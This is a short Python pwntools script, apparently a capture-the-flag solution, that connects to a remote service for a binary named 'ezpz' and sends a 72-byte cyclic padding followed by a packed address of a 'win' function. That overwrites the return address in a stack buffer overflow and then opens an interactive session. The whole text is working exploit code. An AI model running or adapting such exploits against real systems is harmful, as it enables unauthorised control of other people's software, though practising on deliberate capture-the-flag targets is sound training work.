From pwn import *

context.terminal = ['tmux', 'splitw', '-h']
# p = process('./ezpz')
p = remote('plzpwn.me','9447')
# gdb.attach(p, gdbscript='break *ask_question+63')
p.recv()
p.sendline('n')
p.recv()
win = 0x8048714
# p.sendline(cyclic(80))
p.sendline(cyclic(72)+p32(win))
q = p.recv()
print q
p.sendline('a')
q = p.recv()
p.interactive()
print q
